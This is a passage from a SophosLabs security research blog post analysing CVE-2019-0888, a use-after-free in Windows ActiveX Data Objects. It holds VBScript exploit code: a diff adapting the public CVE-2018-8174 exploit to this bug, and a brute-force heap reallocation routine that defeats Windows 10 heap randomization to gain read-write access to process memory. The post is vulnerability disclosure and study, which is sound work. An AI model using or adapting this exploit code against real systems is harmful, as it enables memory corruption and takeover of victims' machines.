<p>Line 35 dereferences <code>freed_object</code>. At this point, any referencing of this variable will invoke a dynamic dispatch on the underlying C++ object, meaning its virtual table pointer will be dereferenced, and a function pointer will be loaded from that memory. Since the virtual table pointer is located at offset 0 of a C++ object, the value that will be loaded, and later cause a memory access violation exception in the first 4 bytes of <code>spray</code>, 0x41414141.</p>



<p>To make this primitive useful for actual exploitation, we would need to rely on knowing a readable, controllable memory address in the program&#8217;s address space &#8211; a feat that is rendered impossible by ASLR. A better approach will have to be used to defeat mitigations like ASLR to exploit this bug on modern systems.</p>



<h2>Advanced Exploitation</h2>



<p>While looking for existing research on exploitation methods for similar VBScript bugs that can be of help here, we came across <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8174">CVE-2018-8174</a>. Dubbed the &#8220;Double Kill&#8221; exploit, it was <a href="https://blog.360totalsecurity.com/en/analysis-cve-2018-8174-vbscript-0day-apt-actor-related-office-targeted-attack/">detected in the wild</a> by security company Qihoo 360 around May 2018. Plenty of articles have been written about dissecting the captured exploit and underlying bug, so for further details we will refer to these:</p>



<p style="padding-left:40px;">[1] <a href="http://blogs.360.cn/post/cve-2018-8174-en.html" target="_blank" rel="noopener">Analysis of CVE-2018-8174 VBScript 0day</a>, 360 Qihoo</p>
<p style="padding-left:40px;">[2] <a href="https://securelist.com/delving-deep-into-vbscript-analysis-of-cve-2018-8174-exploitation/86333/" target="_blank" rel="noopener">Delving deep into VBScript: Analysis of CVE-2018-8174 exploitation</a>, Kaspersky Lab</p>
<p style="padding-left:40px;">[3] <a href="https://medium.com/@florek/dissecting-modern-browser-exploit-case-study-of-cve-2018-8174-1a6046729890" target="_blank" rel="noopener">Dissecting modern browser exploit: case study of CVE-2018–8174</a>, <a href="https://github.com/piotrflorczyk" target="_blank" rel="noopener">piotrflorczyk</a></p>



<p>CVE-2018-8174 is a use-after-free bug in VBScript around the handling of the <code>Class_Terminate</code> callback function. Essentially, it gave the ability to arbitrarily free a VBScript object but keep it referenceable, similar to the ADO bug&#8217;s properties.</p>



<p>The captured exploit implemented a sophisticated technique that employs a type confusion attack to turn the use-after-free capability into an ASLR bypass and read-write-everywhere primitive. The technique itself isn&#8217;t useful on its own (without a bug to enable it), and is technically not a bug, so it was never &#8220;fixed,&#8221; and remains present in the code base. The technique is probably best explained in <a href="https://medium.com/@florek/dissecting-modern-browser-exploit-case-study-of-cve-2018-8174-1a6046729890" target="_blank" rel="noopener">the article by Piotr Florczyk</a>.</p>



<p>Given the similarities between the 2 bugs, it should be possible to take the <a href="https://github.com/piotrflorczyk/cve-2018-8174_analysis/blob/master/analysis.vbs">commented exploit code for CVE-2018-8174</a> from Florczyk&#8217;s writeup, replace the bug-specific code parts to make use of the ADO bug, and have it successfully work the same way. And, indeed, applying this simple patch&#8230;</p>


<pre class="brush: diff; title: ; notranslate" title="">
diff --git a/analysis_base.vbs b/analysis_modified.vbs
index 6c1cd3f..fd25809 100644
--- a/analysis_base.vbs
+++ b/analysis_modified.vbs
@@ -1,3 +1,14 @@
+Dim RS(13)
+For i = 0 to UBound(RS)
+    Set RS(i) = CreateObject(&quot;ADOR.Recordset&quot;)
+    RS(i).Open &quot;SELECT * FROM INFORMATION_SCHEMA.COLUMNS&quot;, _
+        &quot;Provider=SQLOLEDB;&quot; &amp;amp; _
+        &quot;Data Source=.\SQLEXPRESS;&quot; &amp;amp; _
+        &quot;Initial Catalog=master;&quot; &amp;amp; _
+        &quot;Integrated Security=SSPI;&quot; &amp;amp; _
+        &quot;Trusted_Connection=True;&quot;
+Next
+
 Dim FreedObjectArray
 Dim UafArrayA(6),UafArrayB(6)
 Dim UafCounter
@@ -101,7 +112,8 @@ Public Default Property Get Q
     Dim objectImitatingArray
     Q=CDbl(&quot;174088534690791e-324&quot;) ' db 0, 0, 0, 0, 0Ch, 20h, 0, 0
     For idx=0 To 6
-        UafArrayA(idx)=0
+        On Error Resume Next
+        Set m = RS(idx).NextRecordset(resueObjectA_arr)
     Next
     Set objectImitatingArray=New FakeReuseClass
     objectImitatingArray.mem = FakeArrayString
@@ -116,7 +128,8 @@ Public Default Property Get P
     Dim objectImitatingInteger
     P=CDbl(&quot;636598737289582e-328&quot;) ' db 0, 0, 0, 0, 3, 0, 0, 0
     For idx=0 To 6
-        UafArrayB(idx)=0
+        On Error Resume Next
+        Set m = RS(7+idx).NextRecordset(resueObjectB_int)
     Next
     Set objectImitatingInteger=New FakeReuseClass
     objectImitatingInteger.mem=Empty16BString
@@ -136,19 +149,7 @@ Sub UafTrigger
     For idx=20 To 38
         Set objectArray(idx)=New ReuseClass
     Next
-    UafCounter=0    
-    For idx=0 To 6
-        ReDim FreedObjectArray(1)
-        Set FreedObjectArray(1)=New ClassTerminateA
-        Erase FreedObjectArray
-    Next
     Set resueObjectA_arr=New ReuseClass
-    UafCounter=0
-    For idx=0 To 6
-        ReDim FreedObjectArray(1)
-        Set FreedObjectArray(1)=New ClassTerminateB
-        Erase FreedObjectArray
-    Next
     Set resueObjectB_int=New ReuseClass
 End Sub
</pre>


<p>&#8230;produces a working exploit for the ADO bug.</p>



<p>It turns out that this exploit works on systems running Windows 7, but not on Windows 8 or later versions. This is the case with the original captured exploit as well. The exploit breaks due to &#8220;Low fragmentation heap (LFH) allocation order randomization&#8221;, a security measure for the heap introduced in Windows 8 that <a href="https://www.malwaretech.com/2019/04/analysis-of-a-vb-script-heap-overflow.html" target="_blank" rel="noopener">breaks simple use-after-free exploitation</a> scenarios. </p>



<h2>Bypassing LFH Allocation Order Randomization</h2>



<p>Here&#8217;s one example of how heap behavior changed after Microsoft introduced LFH allocation order randomization:</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2019/05/randomization-1.png"><img loading="lazy" class="alignnone size-full wp-image-58437" src="https://news.sophos.com/wp-content/uploads/2019/05/randomization-1.png" alt="" width="621" height="199" srcset="https://news.sophos.com/wp-content/uploads/2019/05/randomization-1.png 621w, https://news.sophos.com/wp-content/uploads/2019/05/randomization-1.png?resize=300,96 300w" sizes="(max-width: 621px) 100vw, 621px" /></a></p>



<p>Introducing allocation order randomization changed the outcome of malloc-&gt;free-&gt;malloc execution, from following a LIFO (Last In First Out) logic to being non-deterministic.</p>



<p>Why does this break the exploit? Consider the following excerpt from the commented exploit code:</p>


<pre class="brush: vb; title: ; notranslate" title="">
Class ReplacingClass_Array
Public Default Property Get Q
    ...
    For idx=0 To 6
        On Error Resume Next
        Set m = RS(idx).NextRecordset(reuseObjectA_arr)
    Next
    Set objectImitatingArray=New FakeReuseClass
    ...
</pre>


<p>In VBScript, all custom class objects are internally represented by the <code>VBScriptClass</code> C++ class. VBScript calls the function <code>VBScriptClass::Create</code>  when it executes a custom class object instantiation statement (for example, line 8). It makes a 0x44-byte-sized allocation to hold the <code>VBScriptClass</code> object.</p>



<p>When control reaches line 8, the <em>For</em> loop has just finished destroying <code>reuseObjectA_arr</code>, which is an instance of custom class <code>ReuseClass</code>. This will cause the <code>VBScriptClass</code> destructor to be called, freeing the 0x44 bytes that had been previously allocated. Line 8 then goes on to create a new object, <code>objectImitatingArray</code>, of a different custom class: <code>FakeReuseClass</code>.</p>



<p>The basis for a successful run of the type confusion attack is the assumption that <strong><code>objectImitatingArray</code> will be assigned the same heap memory resources as the just-freed <code>reuseObjectA_arr</code></strong>. However as noted before, with allocation order randomization enabled, you can&#8217;t make this assumption; the randomized heap breaks the exploit.</p>



<p>As a result of the type confusion attack, a memory corruption occurs. The heap allocation where corruption occurs is not the top-level (0x44) allocation of <code>VBScriptClass</code> itself, but a certain 0x108 bytes sized sub-allocation tied to it, used to store the object&#8217;s methods and variables. The function responsible for this sub-allocation is <code>NameList::FCreateVval</code> and is called shortly after the creation of a <code>VBScriptClass</code> (see <a href="https://securelist.com/delving-deep-into-vbscript-analysis-of-cve-2018-8174-exploitation/86333/" target="_blank" rel="noopener">article [2]</a>).</p>



<p>To be more specific about the condition that needs to be met, the type confusion will work if, <strong>after the destruction of <code>reuseObjectA_arr</code>, a new VBScript object receives the same address for its 0x108 allocation as the one <code>reuseObjectA_arr</code> previously held</strong>. Other allocations tied to the two objects, including the 0x44 sized top-level allocation, don&#8217;t necessarily have to get matching addresses.</p>



<p>The specifics of the memory corruption part of the technique is not very straightforward to understand and it&#8217;s advised to read <a href="https://securelist.com/delving-deep-into-vbscript-analysis-of-cve-2018-8174-exploitation/86333/" target="_blank" rel="noopener">the Kaspersky background article</a> to get a better understanding of it, but here&#8217;s the gist of it.</p>
<p><code>ReuseClass</code>&#8216;s method, <code>SetProp</code>, has the following statement: <em>mem=Value</em>. <code>Value</code> is an object variable, so its <a href="http://www.stealthbot.net/wiki/VBScript_class#Default_property_or_method">Default Property Getter</a> will have to be invoked <em>before</em> the assignment can be completed.</p>
<p>The VBScript engine (vbscript.dll) calls internal function <code>AssignVar</code> to perform an assignment of this kind. This is a simplified pseudo-code to explain how it works:</p>


<pre class="brush: cpp; title: ; notranslate" title="">
AssignVar(VARIANT *destinationObject, char *destinationVariableName, VARIANT *source) {
  // here, destinationObject is a ReuseClass instance, destinationVariableName is &quot;mem&quot;, source is &lt;Value&amp;gt;

  // get the address of object &lt;destinationObject&amp;gt;'s member variable with the name &lt;destinationVariableName&amp;gt;.
  VARIANT *destinationPointer = CScriptRuntime::GetVarAdr(destinationObject, destinationVariableName);

  // if the given source is an object, call the object's
  // default property getter to get the actual source value
  if (source-&amp;gt;vt == VT_IDISPATCH) {
    VARIANT *sourceValue = VAR::InvokeByDispID(source);
  }

  // perform the assignment
  *destinationPointer = *sourceValue;
}    
</pre>


<p>The function <code>VAR::InvokeByDispID</code> invokes the source object&#8217;s default property getter, allowing us to run arbitrary VBScript code in the midst of <code>AssignVar</code>&#8216;s execution. If we use that space to trigger the destruction and replacement in memory of <code>destinationObject</code> (using the bug), we can take advantage of <code>AssignVar</code> proceeding to perform the assignment into <code>destinationPointer</code> (line 14) <strong>without realizing the memory it points to could have been tampered with</strong>.</p>
<p>The memory address being written into is the value returned by <code>CScriptRuntime::GetVarAdr</code>, which is a pointer to somewhere inside the given object&#8217;s 0x108 allocation. Its exact offset into the allocation depends on the given object&#8217;s class definition &#8211; particularly, how long the names of its methods and fields are.</p>
<p><code>ReuseClass</code> and <code>FakeReuseClass</code>&#8216;s definitions are arranged in a way to force a different offset for common member variable <code>mem</code>. Doing this, we&#8217;re forcing the final assignment to corrupt an object&#8217;s <code>mem</code> variable&#8217;s <strong>header</strong> in order to turn it into an Array type whose base pointer is NULL and its length is 0x7fffffff.</p>



<p>CVE-2018-8174&#8217;s exploit uses a one-shot approach for attempting to pull off the type confusion attack, meaning that <strong>only a single new object</strong> is created after the destruction of <code>reuseObjectA_arr</code>. As we explained before, this will only reliably work on Windows systems prior to Windows 8, which lack the LFH Allocation Order Randomization feature.</p>



<p>To make this exploit work on Windows 10 systems, we can implement a <strong>brute-force approach</strong> for attempting the type confusion attack. Instead of creating a single new object, we can mass-create new objects to ensure the freed 0x108 allocation will ultimately get assigned into one of them.</p>



<p>Here&#8217;s how the code can be transformed into implementing a brute-force approach:</p>



<pre class="wp-block-preformatted wp-block-syntaxhighlighter-code brush: vb; notranslate">Set reuseObjectA_arr=New ReuseClass
...
Class ReplacingClass_Array
Public Default Property Get Q
    Dim objectImitatingArray
    
    Q=CDbl("174088534690791e-324") ' db 0, 0, 0, 0, 0Ch, 20h, 0, 0
    
    For i=0 To 6
        DecrementRefcount(reuseObjectA_arr)
    Next

    For i=0 to UBound(UafArrayA)
        Set objectImitatingArray=New FakeReuseClass
        objectImitatingArray.mem = FakeArrayString
        For j=0 To 6
            Set UafArrayA(i,j)=objectImitatingArray
        Next
    Next
End Property
End Class</pre>



<p>Here&#8217;s a visualization of the above code&#8217;s logic in action:</p>
<!-- /wp:image -->
<figure id="attachment_58439" aria-describedby="caption-attachment-58439" style="width: 636px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2019/05/ado_bruteforce-1.png"><img loading="lazy" class="size-full wp-image-58439" src="https://news.sophos.com/wp-content/uploads/2019/05/ado_bruteforce-1.png" alt="" width="636" height="576" srcset="https://news.sophos.com/wp-content/uploads/2019/05/ado_bruteforce-1.png 636w, https://news.sophos.com/wp-content/uploads/2019/05/ado_bruteforce-1.png?resize=300,272 300w" sizes="(max-width: 636px) 100vw, 636px" /></a><figcaption id="caption-attachment-58439" class="wp-caption-text">UafArrayA(38) receives the same 0x108 allocation (Vval) as reuseObjectA_arr</figcaption></figure>
<!-- wp:paragraph -->
<p>After the <code>UafArrayA</code> array has been mass-filled with new <code>FakeReuseClass</code> objects and the <em><code>mem=Value</code></em> assignment completes, we can iterate over the array and find the object whose <code>mem</code> variable has been successfully corrupted to become an array:</p>
<!-- /wp:paragraph -->

<!-- wp:syntaxhighlighter/code {"language":"vb"} -->
<pre class="wp-block-syntaxhighlighter-code brush: vb; notranslate">For i=0 To UBound(UafArrayA)
    Err.Clear
    a = UafArrayA(i,0).mem(Empty16BString_addr)
    If Err.Number = 0 Then
        Exit For
    End If
Next
If i &gt; UBound(UafArrayA) Then
    MsgBox("Could not find an object corrupted by reuseObjectA_arr")
Else
    MsgBox("Got UafArrayA_obj from UafArrayA(" &amp; i &amp; ")")
    Set UafArrayA_obj = UafArrayA(i,0)
End If</pre>
<!-- /wp:syntaxhighlighter/code -->

<!-- wp:paragraph -->
<p>The corrupted object will be the only one not to cause an exception to be thrown on line 3. Once we find it, it can be referenced with any index, allowing to read and write all addresses in the process memory space.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>With this fix to the original exploit, it <strong>now works on Windows 10 systems as well.</strong></p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>PoC</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>You can find the proof-of-concept file on the <a href="https://github.com/sophoslabs/CVE-2019-0888">SophosLabs GitHub repository</a>.</p>
<!-- /wp:paragraph -->			</div><!-- .entry-content -->

</article><!-- #post-## -->

					<nav class="navigation post-navigation" role="navigation">
			<h2 class="screen-reader-text">Post navigation</h2>
			<div class="nav-links">
	   			<div class="nav-previous">
											<span class="nav-label">Prev</span>
						<a href="https://news.sophos.com/en-us/2019/07/04/7-best-practices-for-securing-the-public-cloud/" rel="prev">7 best practices for securing the public cloud</a>
						   			</div>
	   			<div class="nav-next">
											<span class="nav-label">Next</span>
						<a href="https://news.sophos.com/en-us/2019/07/09/16-critical-vulnerabilities-some-being-exploited-fixed-in-july-2019-windows-updates/" rel="next">16 critical vulnerabilities, some being exploited, fixed in July, 2019 Windows updates</a>
						   			</div>
		 	</div><!-- .nav-links -->
		</nav><!-- .navigation -->
		
			<div class="article-author-block article-co-authors-block">
	
					<h2 class="author-title">
				About the Author			</h2>
		
					<div class="author-block-container">
				<div class="author-profile">
					<img width="145" height="145" src="https://news.sophos.com/wp-content/uploads/2019/05/sophos-labs-logo.png?w=145" class="avatar avatar-145 photo wp-post-image" alt="SophosLabs" />				</div> <!-- .author-profile -->

				<div class="author-description">
					<h3 class="author-name"><a href="https://news.sophos.com/en-us/author/7u7bdp6d/" title="Posts by SophosLabs Offensive Security" class="author url fn" rel="author">SophosLabs Offensive Security</a></h3>

					
					<div class="author-bio">
											</div> <!-- .author-bio -->
				</div> <!-- .author-description -->
			</div> <!-- .author-block-container -->
			</div>

			
<div id="comments" class="comments-area">

	
	
	
		<div id="respond" class="comment-respond">
		<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/en-us/2019/07/09/cve-2019-0888-use-after-free-in-windows-activex-data-objects-ado/#respond" style="display:none;">Cancel reply</a></small></h3><form action="https://news.sophos.com/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate><p class="comment-notes"><span id="email-notes">Your email address will not be published.</span></p><p class="comment-form-comment"><label for="comment">Comment</label> <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" required="required"></textarea></p><p class="comment-form-author"><label for="author">Name</label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" /></p>
<p class="comment-form-email"><label for="email">Email</label> <input id="email" name="email" type="email" value="" size="30" maxlength="100" aria-describedby="email-notes" /></p>
<p class="comment-form-url"><label for="url">Website</label> <input id="url" name="url" type="url" value="" size="30" maxlength="200" /></p>
<p class="comment-form-cookies-consent"><input id="wp-comment-cookies-consent" name="wp-comment-cookies-consent" type="checkbox" value="yes" /> <label for="wp-comment-cookies-consent">Save my name, email, and website in this browser for the next time I comment.</label></p>
<input type="hidden" name="redirect_to" value="https://news.sophos.com/en-us/2019/07/09/cve-2019-0888-use-after-free-in-windows-activex-data-objects-ado/" id="redirect_to"><p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment" /> <input type='hidden' name='comment_post_ID' value='57686' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
</p><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="c031b674a7" /></p><input type="hidden" id="ak_js" name="ak_js" value="33"/><textarea name="ak_hp_textarea" cols="45" rows="8" maxlength="100" style="display: none !important;"></textarea></form>	</div><!-- #respond -->
	
</div><!-- #comments -->

		
		</main><!-- #main -->
	</div><!-- #primary -->


<div id="secondary" class="widget-area" role="complementary">
			
		<div id="second-article-wrapper" class="article-wrapper">
			<h3 class="widget-title">You might also enjoy...</h3>
			<article id="post-58306" class="second-featured post-58306 post type-post status-publish format-standard has-post-thumbnail hentry category-sophoslabs-uncut tag-adobe tag-chakra tag-chakracore tag-edge tag-exploits tag-flash-player tag-hyper-v tag-microsoft tag-patch-tuesday tag-polar-bears tag-sandboxescaper tag-updates tag-vbscript tag-vulnerability tag-windows region-en-us">
	<div class="second-featured__image" style="background-image: url('https://news.sophos.com/wp-content/uploads/2016/09/bug-bounty-google.png?w=640');">
		<div class="featured-entry-meta">
			<div class="featured-entry-date">
				<span class="day-num">11</span>
				<span class="month">Jun</span>
			</div>
		</div>
	</div>
	<div class="second-featured__content">
		<header class="featured-entry-header">
			<div class="featured-entry-categories">
					<a href="https://news.sophos.com/en-us/category/sophoslabs/sophoslabs-uncut/">SophosLabs Uncut</a>			</div>
			<h1 class="featured-entry-title dot-ellipsis dot-resize-update dot-load-update dot-height-130"><a href="https://news.sophos.com/en-us/2019/06/11/patch-tuesday-squashes-89-bugs-including-a-sophoslabs-find/" rel="bookmark">Patch Tuesday squashes 89 bugs-including a SophosLabs find</a></h1>		</header> <!-- featured-entry-header -->
	</div>
</article> <!-- post -->
<article id="post-57782" class="second-featured post-57782 post type-post status-publish format-standard has-post-thumbnail hentry category-sophoslabs-uncut tag-chakra tag-microsoft tag-patch-tuesday tag-rdp tag-remote-desktop-services tag-smb tag-update tag-windows region-en-us">
	<div class="second-featured__image" style="background-image: url('https://news.sophos.com/wp-content/uploads/2019/04/patch-tuesday.jpg?w=640');">
		<div class="featured-entry-meta">
			<div class="featured-entry-date">
				<span class="day-num">14</span>
				<span class="month">May</span>
			</div>
		</div>
	</div>
	<div class="second-featured__content">
		<header class="featured-entry-header">
			<div class="featured-entry-categories">
					<a href="https://news.sophos.com/en-us/category/sophoslabs/sophoslabs-uncut/">SophosLabs Uncut</a>			</div>
			<h1 class="featured-entry-title dot-ellipsis dot-resize-update dot-load-update dot-height-130"><a href="https://news.sophos.com/en-us/2019/05/14/may-2019-patch-tuesday-addresses-critical-remote-desktop-dhcp-bugs/" rel="bookmark">May, 2019 Patch Tuesday addresses critical remote desktop, DHCP bugs</a></h1>		</header> <!-- featured-entry-header -->
	</div>
</article> <!-- post -->
<article id="post-57026" class="second-featured post-57026 post type-post status-publish format-standard has-post-thumbnail hentry category-sophoslabs-uncut tag-cve-2018-18500 tag-exploit tag-firefox tag-mitigation tag-vulnerability region-en-us">
	<div class="second-featured__image" style="background-image: url('https://news.sophos.com/wp-content/uploads/2018/04/exploits-explained.jpg?w=640');">
		<div class="featured-entry-meta">
			<div class="featured-entry-date">
				<span class="day-num">18</span>
				<span class="month">Apr</span>
			</div>
		</div>
	</div>
	<div class="second-featured__content">
		<header class="featured-entry-header">
			<div class="featured-entry-categories">
					<a href="https://news.sophos.com/en-us/category/sophoslabs/sophoslabs-uncut/">SophosLabs Uncut</a>			</div>
			<h1 class="featured-entry-title dot-ellipsis dot-resize-update dot-load-update dot-height-130"><a href="https://news.sophos.com/en-us/2019/04/18/protected-cve-2018-18500-heap-write-after-free-in-firefox-analysis-and-exploitation/" rel="bookmark">CVE-2018-18500: write-after-free vulnerability in Firefox, Analysis and Exploitation</a></h1>		</header> <!-- featured-entry-header -->
	</div>
</article> <!-- post -->
		</div>

	</div> <!-- #secondary -->


		</div> <!-- .container -->
	</div> <!-- #content -->
	<footer>
		<section class="cta">
			<p>Start a Sophos demo in less than a minute. See exactly how our solutions work in a full environment without a commitment.</p>
			<a href="https://secure2.sophos.com/en-us/products/demos.aspx?cmp=70130000001xKqzAAE">Learn More</a>
		</section>
		<section class="connected">
			<div class="social">
				<h3>Stay Connected</h3>
				<ul>
					<li><a href="https://www.facebook.com/securitybysophos" target="_blank"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/facebook-icon.svg?la=en&amp;hash=1CA0A5A0E9C9999E7E079A5D32C86E9BF9C7AD1E" alt="Facebook"></a>
					</li>
					<li><a href="https://www.instagram.com/sophossecurity/" target="_blank"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/instagram-icon.svg?la=en&amp;hash=2B50C2B67C3023D9E7D4E1C3A16401EAD8F10F76" alt="Instagram"></a>
					</li>
					<li><a href="https://www.linkedin.com/company/sophos" target="_blank"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/linkedin-icon.svg?la=en&amp;hash=B6D5378C1E1A16F239A4C862EAE3499B8EC1F3F9" alt="LinkedIn"></a></li>
					<li><a href="https://www.sophos.com/en-us/company/rss-feeds.aspx"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/rss-icon.svg?la=en&amp;hash=76C4DAFD331DC675814191A66794A778D8C6DCF7" alt="RSS"></a></li>
					<li><a href="https://twitter.com/Sophos" target="_blank"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/twitter-icon.svg?la=en&amp;hash=9A90D9F99ABE6454741BBAAF9C3FB6966624C92D" alt="Twitter"></a></li>
					<li><a href="https://www.youtube.com/user/SophosProducts" target="_blank"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/youtube-icon.svg?la=en&amp;hash=CCCF647AFA78C8DB74D654DB9FEFBF0AC54F42D3" alt="YouTube"></a></li>
				</ul>
			</div>
			<ul class="links">
				<li><a href="https://www.sophos.com/en-us/company/careers.aspx">Careers </a></li>
				<li><a href="https://www.sophos.com/en-us/partners/partner-locator.aspx">Find a Partner</a></li>
				<li><a href="https://secure2.sophos.com/en-us/support.aspx">Support</a></li>
				<li><a href="https://www.sophos.com/en-us/threat-center/technical-papers.aspx">Technical Papers</a></li>
				<li><a href="https://www.sophos.com/en-us/security-news-trends/whitepapers.aspx">Whitepapers</a></li>
			</ul>
		</section>
		<section class="legal">
			<div class="copyright">&copy; 1997 - 2021 Sophos Ltd. All rights reserved</div>
			<ul>
				<li><a href="https://www.sophos.com/en-us/legal.aspx">Legal</a></li>
				<li><a href="https://www.sophos.com/en-us/legal/sophos-group-privacy-policy.aspx">Privacy</a></li>
				<li><a href="https://www.sophos.com/en-us/legal/cookie-information.aspx">Cookie Information</a></li>
				<li><a href="https://www.sophos.com/en-us/legal/modern-slavery-act-transparency-statement.aspx">Modern Slavery Statement</a></li>
			</ul>
		</section>
		<div class="vip" style="background: #002939">
			Powered by <a href="https://wpvip.com/?utm_source=vip_powered_wpcom&#038;utm_medium=web&#038;utm_campaign=VIP%20Footer%20Credit&#038;utm_term=news.sophos.com" rel="generator nofollow" class="powered-by-wpcom">WordPress VIP</a>		</div>
	</footer>
	<script type='text/javascript' src='https://news.sophos.com/_static/??-eJzTLy/QTc7PK0nNK9EvyClNz8wr1i+uzCtJrMjITM/IAeKS1CJMEWP94uSizIISoOIM5/yiVL2sYh19yo1yKiotzghLoqZpLplpadQ0z7mgAGicfa6toZmhqYGxkZmBURYAYYF9mw=='></script>
<script type='text/javascript'>
	(function(){
		var corecss = document.createElement('link');
		var themecss = document.createElement('link');
		var corecssurl = "https://news.sophos.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shCore.css?ver=3.0.9b";
		if ( corecss.setAttribute ) {
				corecss.setAttribute( "rel", "stylesheet" );
				corecss.setAttribute( "type", "text/css" );
				corecss.setAttribute( "href", corecssurl );
		} else {
				corecss.rel = "stylesheet";
				corecss.href = corecssurl;
		}
		document.head.appendChild( corecss );
		var themecssurl = "https://news.sophos.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shThemeDefault.css?ver=3.0.9b";
		if ( themecss.setAttribute ) {
				themecss.setAttribute( "rel", "stylesheet" );
				themecss.setAttribute( "type", "text/css" );
				themecss.setAttribute( "href", themecssurl );
		} else {
				themecss.rel = "stylesheet";
				themecss.href = themecssurl;
		}
		document.head.appendChild( themecss );
	})();
	SyntaxHighlighter.config.strings.expandSource = '+ expand source';
	SyntaxHighlighter.config.strings.help = '?';
	SyntaxHighlighter.config.strings.alert = 'SyntaxHighlighter\n\n';
	SyntaxHighlighter.config.strings.noBrush = 'Can\'t find brush for: ';
	SyntaxHighlighter.config.strings.brushNotHtmlScript = 'Brush wasn\'t configured for html-script option: ';
	SyntaxHighlighter.defaults['auto-links'] = false;
	SyntaxHighlighter.defaults['pad-line-numbers'] = false;
	SyntaxHighlighter.defaults['toolbar'] = false;
	SyntaxHighlighter.all();

	// Infinite scroll support
	if ( typeof( jQuery ) !== 'undefined' ) {
		jQuery( function( $ ) {
			$( document.body ).on( 'post-load', function() {
				SyntaxHighlighter.highlight();
			} );
		} );
	}
</script>
<script id='sophos-js-core-js-extra'>
var PG8Data = {"startPage":"1","maxPages":"1","nextLink":""};
</script>
<script type='text/javascript' src='https://news.sophos.com/_static/??-eJyVkMEOwiAMhl9IQGY2T8ZHMcjqxkaBUHD69mKWJR48jKSX/v2+NqlYAtPeJXBJpBEQSJAPoycHC7HmKM9iolIF8rMB9mx4w2UJ+BrwiQ5i1w7tYwUNrxQV7efXiOdkbL2lFQZlBlctBhWTg1jtDapa+WabZJy2uQda34pYFrAIwb45GvcPKi3gHfrf+XYZMws2D8aRULMhhCRuxRUPH7GwV7zITranRrZtN30AbTfKEQ=='></script>
<script src='https://stats.wp.com/e-202112.js' defer></script>
<script>
	_stq = window._stq || [];
	_stq.push([ 'view', {v:'ext',j:'1:9.5.2',blog:'166161023',post:'57686',tz:'-4',srv:'news.sophos.com'} ]);
	_stq.push([ 'clickTrackerInit', '166161023', '57686' ]);
</script>
</body>
</html>
